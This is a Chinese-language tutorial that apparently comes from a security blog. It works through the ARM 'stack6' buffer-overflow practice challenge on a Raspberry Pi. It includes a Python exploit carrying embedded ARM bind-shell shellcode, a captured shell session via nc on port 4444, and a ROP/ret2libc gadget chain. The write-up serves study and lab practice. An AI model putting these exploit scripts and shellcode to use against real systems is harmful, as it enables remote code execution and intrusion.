> 原文链接: https://www.anquanke.com//post/id/170651 


# ARM汇编之堆栈溢出实战分析四(GDB)


                                阅读量   
                                **208407**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01440f95e5b70da9fb.jpg)](https://p0.ssl.qhimg.com/t01440f95e5b70da9fb.jpg)



## 引言

这是最后一个实例stack6的分析实战过程，中间跳过了两个例子，他们的解决思路在前面每个例子的尾部EXP的构造、实现中已经得到了体现，就不再写一些重复的内容，今天主要带来的是几个新技巧：**ret2zp（ret2libc+ROP）**，通过这两中技术来绕过栈保护机制



## 文件预分析

**1.`file stack6`**，恩，二进制可执行文件,ARM架构,符号表未移除<br>**stack6: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.32, BuildID[sha1]=272f2356191b2176339c44f8376ec3407280a879, not stripped**

**2.`objdump -d ./stack6`**,下面是反汇编结果。这里main函数主要只有一个调用getpath函数的操作。下面主要介绍getpath函数的代码逻辑。

1)在`104e4:    e1a0400e     mov    r4, lr`地址的地方将当前这个getpath栈帧的返回地址给了r4。然后`1050c:   e1a03004    mov r3, r4`又把返回地址赋值给了r3<br>
2)分析下面的片段代码可以知道，`and    r3, r3, #-1090519040`将所有0xbf开头的地址都修改成了0xbf000000，然后跟0xbf000000对比，如果相等就分支跳转到地址为0x10538地方继续执行，否则就退出。<br>
3)栈地址的开头都是`0xbf`，可以使用命令`info proc map`查看当前运行进程的内存映射

```
10518:    e20334bf     and    r3, r3, #-1090519040    ; 0xbf000000
   1051c:    e35304bf     cmp    r3, #-1090519040    ; 0xbf000000
   10520:    1a000004     bne    10538 &lt;getpath+0x60&gt;
```

`info proc map`查看结果，内存映射可读属性，顺便可以查看地址

```
gef&gt; i proc map
process 3303
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
       0x10000    0x11000     0x1000        0x0 /home/pi/Desktop/ARM-challenges/stack6
       0x20000    0x21000     0x1000        0x0 /home/pi/Desktop/ARM-challenges/stack6
    0xb6e74000 0xb6f9f000   0x12b000        0x0 /lib/arm-linux-gnueabihf/libc-2.19.so
    0xb6f9f000 0xb6faf000    0x10000   0x12b000 /lib/arm-linux-gnueabihf/libc-2.19.so
    0xb6faf000 0xb6fb1000     0x2000   0x12b000 /lib/arm-linux-gnueabihf/libc-2.19.so
    0xb6fb1000 0xb6fb2000     0x1000   0x12d000 /lib/arm-linux-gnueabihf/libc-2.19.so
    0xb6fb2000 0xb6fb5000     0x3000        0x0 
    0xb6fcc000 0xb6fec000    0x20000        0x0 /lib/arm-linux-gnueabihf/ld-2.19.so
    0xb6ff8000 0xb6ffb000     0x3000        0x0 
    0xb6ffb000 0xb6ffc000     0x1000    0x1f000 /lib/arm-linux-gnueabihf/ld-2.19.so
    0xb6ffc000 0xb6ffd000     0x1000    0x20000 /lib/arm-linux-gnueabihf/ld-2.19.so
    0xb6ffd000 0xb6fff000     0x2000        0x0 
    0xb6fff000 0xb7000000     0x1000        0x0 [sigpage]
    0xbefdf000 0xbf000000    0x21000        0x0 [stack]
    0xffff0000 0xffff1000     0x1000        0x0 [vectors]
```

4)根据上面的三个点我们可以知道，它对栈地址进行一定的保护机制，让gets不能直接执行将栈地址溢出覆盖到返回地址，所以引出了几种解决技术：第一个就是它只是限制`bf`开头的栈地址，我们不跳到这个地址就行了，我们尝试再次执行一次`1054c:    e8bd8810     pop    `{`r4, fp, pc`}``，将我们shellcode的首地址让pc成功接收就行

```
000104d8 &lt;getpath&gt;:
   104d8:    e92d4810     push    `{`r4, fp, lr`}`
   104dc:    e28db008     add    fp, sp, #8
   104e0:    e24dd04c     sub    sp, sp, #76    ; 0x4c
   104e4:    e1a0400e     mov    r4, lr
   104e8:    e59f0060     ldr    r0, [pc, #96]    ; 10550 &lt;getpath+0x78&gt;
   104ec:    ebffff9a     bl    1035c &lt;printf@plt&gt;
   104f0:    e59f305c     ldr    r3, [pc, #92]    ; 10554 &lt;getpath+0x7c&gt;
   104f4:    e5933000     ldr    r3, [r3]
   104f8:    e1a00003     mov    r0, r3
   104fc:    ebffff9c     bl    10374 &lt;fflush@plt&gt;
   10500:    e24b3050     sub    r3, fp, #80    ; 0x50
   10504:    e1a00003     mov    r0, r3
   10508:    ebffff96     bl    10368 &lt;gets@plt&gt;
   1050c:    e1a03004     mov    r3, r4
   10510:    e50b3010     str    r3, [fp, #-16]
   10514:    e51b3010     ldr    r3, [fp, #-16]
   10518:    e20334bf     and    r3, r3, #-1090519040    ; 0xbf000000
   1051c:    e35304bf     cmp    r3, #-1090519040    ; 0xbf000000
   10520:    1a000004     bne    10538 &lt;getpath+0x60&gt;
   10524:    e59f002c     ldr    r0, [pc, #44]    ; 10558 &lt;getpath+0x80&gt;
   10528:    e51b1010     ldr    r1, [fp, #-16]
   1052c:    ebffff8a     bl    1035c &lt;printf@plt&gt;
   10530:    e3a00001     mov    r0, #1
   10534:    ebffff91     bl    10380 &lt;_exit@plt&gt;
   10538:    e24b3050     sub    r3, fp, #80    ; 0x50
   1053c:    e59f0018     ldr    r0, [pc, #24]    ; 1055c &lt;getpath+0x84&gt;
   10540:    e1a01003     mov    r1, r3
   10544:    ebffff84     bl    1035c &lt;printf@plt&gt;
   10548:    e24bd008     sub    sp, fp, #8
   1054c:    e8bd8810     pop    `{`r4, fp, pc`}`
   10550:    000105f8     .word    0x000105f8
   10554:    0002075c     .word    0x0002075c
   10558:    0001060c     .word    0x0001060c
   1055c:    00010618     .word    0x00010618

00010560 &lt;main&gt;:
   10560:    e92d4800     push    `{`fp, lr`}`
   10564:    e28db004     add    fp, sp, #4
   10568:    e24dd008     sub    sp, sp, #8
   1056c:    e50b0008     str    r0, [fp, #-8]
   10570:    e50b100c     str    r1, [fp, #-12]
   10574:    ebffffd7     bl    104d8 &lt;getpath&gt;
   10578:    e1a00003     mov    r0, r3
   1057c:    e24bd004     sub    sp, fp, #4
   10580:    e8bd8800     pop    `{`fp, pc`}`
```

利用一个exp，功能是：先填充到返回地址前，再利用返回地址后的任意一个栈地址（nop指令区间就行），将返回地址覆盖，在用点nop来防止环境变量的改变影响栈偏移，最后加上shellcode。

```
import struct
padding = "11111111111111111111111111111111111111111111111111111111111111111111111111111111"
return_addr = struct.pack("I", 0xbefff0d0)

payload1 = "x01x30x8fxe2x13xffx2fxe1x01x21x48x1cx92x1axc8x27x51x37x01xdfx04x1cx14xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx60x1cx01x38x02x21x02x37x01xdfx60x1cx01x38x49x40x52x40x01x37x01xdfx04x1cx60x1cx01x38x49x1ax3fx27x01xdfxc0x46x60x1cx01x38x01x21x01xdfx60x1cx01x38x02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58"

print padding + return_addr + "x90"*100 + payload1
```

执行结果

`受控端`

```
pi@raspberrypi:~/Desktop/ARM-challenges $ ./stack6 &lt;exp
input path please: got path 1111111111111111111111111111111111111111111111111111111111111111x
```

`控制端`

```
pi@raspberrypi:~/Desktop/ARM-challenges $ nc -vv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
ls
README.md
ROPgadget
core
e4
exp
poc.py
stack0
stack1
stack2
stack3
stack4
stack5
stack6
exit
```



## ret2zp(return to Zero Prevention)

`我们尝试使用：/bin/sh,需要用到system函数`（并不一定可以实现，因为我们需要得到system[@plt](https://github.com/plt)的地址）

当我使用想使用ret2libc的时候发现，它不是使用栈空间来传递参数的，而是使用寄存器来传递参数的，也就是x86架构的ret2libc不适用arm架构，怎么办呢？我在[exploitation-on-arm](https://www.exploit-db.com/docs/english/14548-exploitation-on-arm---presentation.pdf)这里找到了答案，在[另外一片文章](https://doc.lagout.org/security/XXXX_ARM_exploitation.pdf)找到一些实例。下面我们用到了一个工具帮助我们快速查找特定指令

ROPgadgets工具安装过程(如果执行中出错，按照github上给的方法，注释特定出错的地方)

```
sudo apt-get install python-capstone
git clone https://github.com/JonathanSalwan/ROPgadget.git
sudo python setup.py install
```

安装完成后，我们就来查看stack6程序内部是否有可以利用的代码片段，可以看到如果要用到下面的语句片段我们必须还有一个语句将r0赋值给r3或r4，因为要r0才是我们要存储参数的地方。这里根据[ret2ZP技术的一些实际的例子](https://doc.lagout.org/security/XXXX_ARM_exploitation.pdf)里的指出的一个函数`seed48`可以间接的实现参数传递，下面介绍具体步骤：

```
pi@raspberrypi:~/Desktop/ARM-challenges $ ROPgadget --binary ./stack6 --only "pop"
Gadgets information
============================================================
0x00010344 : pop `{`r3, pc`}`
0x00010498 : pop `{`r4, pc`}`

Unique gadgets found: 2
```

`seed48片段`

```
0xb6ea5df8 &lt;+20&gt;:    add    r0, r4, #6
   0xb6ea5dfc &lt;+24&gt;:    pop    `{`r4, pc`}`
```

在getpath函数的pop处，我们将seed48函数内的`0xb6ea5dfc`覆盖到返回地址处，他会执行到`pop    `{`r4, pc`}``，然后我们`/bin/sh`地址减6的值放在下一个栈地址，准备pop到r4内，然后再将`0xb6ea5df8`放入压入栈中pop进pc来实现r0的赋值

```
第一步：覆盖返回地址（python脚本）
import struct
padding = "11111111111111111111111111111111111111111111111111111111111111111111111111111111"
return_addr = struct.pack("I", 0xb6ea5dfc)
print padding + return_addr

第二步：找到/bin/sh的地址
gef&gt; find 0xb6e74000,+9999999,"/bin/sh"
0xb6f91b20

第三步：0xb6f91b20-6=0xb6f91b1a放入栈中准备赋值给r4，再把0xb6ea5df8 赋给pc，进行r0的赋值
import struct
padding = "11111111111111111111111111111111111111111111111111111111111111111111111111111111"
return_addr = struct.pack("I", 0xb6ea5dfc)
print padding + return_addr + "x1ax1bxf9xb6" + "xf8x5dxeaxb6"

第四步：寻找system地址
使用命令objdump -d stack6查看是否存在system@plt，发现本程序并没有system函数的入口点
```

根据上面的流程，一切都准备好了，结果没有找到system函数入口，所以RET2ZP（ROP+RET2LIBC）使用失败，主要熟悉了这种技术的使用流程，退而求其次我们使用可执行文件内有的函数exit，来直接退出。

`objdump -d stack6`找到plt表内的地址，然后直接覆盖到准备pop到pc寄存器的栈地址

```
00010380 &lt;_exit@plt&gt;:
   10380:       e28fc600        add     ip, pc, #0, 12
   10384:       e28cca10        add     ip, ip, #16, 20 ; 0x10000
   10388:       e5bcf3b8        ldr     pc, [ip, #952]! ; 0x3b8
```

`poc.py`

```
import struct
padding = "11111111111111111111111111111111111111111111111111111111111111111111111111111111"
print padding + "x80x03x01x00"
```

执行结果，直接退出：

```
pi@raspberrypi:~/Desktop/ARM-challenges $ ./stack6 &lt;exp
input path please: got path 1111111111111111111111111111111111111111111111111111111111111111x♣
pi@raspberrypi:~/Desktop/ARM-challenges $
```



## 小结

当我分析到绕过bf开头的堆栈检测这个保护机制的时候，我在一个程序的执行流程这个花了些时间，得到一个小点：`程序向下执行都是依靠PC寄存器，即使返回到上一个栈帧也是将返回地址赋值给PC寄存器`，**掌控PC你就掌控了一切**

使用ret2libc+ROP技术的时候，我们需要找到的是plt表内存在的函数入口地址，才继续接下来的执行



## 参考

> [exploitation-on-arm](https://www.exploit-db.com/docs/english/14548-exploitation-on-arm---presentation.pdf)<br>[ret2ZP技术的一些实际的例子](https://doc.lagout.org/security/XXXX_ARM_exploitation.pdf)<br>[github上的开源工具ROPgadget Tool](https://github.com/JonathanSalwan/ROPgadget)<br>[Fix the run-time error by CS_ARCH_SPARC](https://github.com/wonhongkwon/ROPgadget/commit/8e520b8304bcad48a701d1a6860a822140536025)<br>[基本ROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/)
